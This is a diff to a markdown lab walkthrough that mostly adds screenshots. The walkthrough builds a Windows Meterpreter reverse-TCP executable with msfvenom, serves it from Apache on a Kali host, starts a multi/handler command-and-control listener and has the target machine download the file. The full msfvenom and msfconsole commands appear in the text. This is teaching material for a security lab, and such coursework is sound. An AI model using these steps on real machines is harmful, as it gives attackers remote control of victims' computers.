@@ -62,36 +62,49 @@ msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload
 Find the attackers ip address using ifconfig
 
 ### Output:
+<img width="642" height="355" alt="image" src="https://github.com/user-attachments/assets/15043968-9f5c-43e8-9205-e26214cb562f" />
+
 
 
 
 Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```
 
 ### Output:
+<img width="826" height="150" alt="image" src="https://github.com/user-attachments/assets/9166c2f7-2adc-4080-a5fd-fc4ac05835ab" />
 
 
 
 copy the fun.exe into the apache ```/var/www/html ```folder
 
+<img width="305" height="44" alt="image" src="https://github.com/user-attachments/assets/bbfe19b1-9487-4d4d-becc-6bc78dfcecaf" />
 
 
 Start apache server ```sudo systemctl apache2 start``` 
+<img width="266" height="43" alt="image" src="https://github.com/user-attachments/assets/97568b08-9773-4183-9f49-ef49f2ccca18" />
+
 
 
 
 Check the status of apache2 ```sudo apache2 status```
+<img width="778" height="264" alt="image" src="https://github.com/user-attachments/assets/935555ce-16f1-4c99-af75-d4ac39b3a518" />
 
 
 Invoke msfconsole:
+<img width="609" height="322" alt="image" src="https://github.com/user-attachments/assets/c9aaa4d1-c3a7-4634-b043-2b7e9c9eabef" />
 
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
+<img width="805" height="270" alt="image" src="https://github.com/user-attachments/assets/0dd461c9-eac5-4577-b527-c613a69b44b9" />
+
 
 Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```
 
 ### Output 
+<img width="592" height="157" alt="image" src="https://github.com/user-attachments/assets/078473de-7c30-45a4-894c-e74b73a3c64c" />
 
 
-On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.
+
+On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://10.0.2.15/nishaj.exe``` The file "nishaj.exe" downloads.
+<img width="940" height="900" alt="image" src="https://github.com/user-attachments/assets/fc4096f9-39df-4926-b158-ec56dbae7eec" />
 
 
 
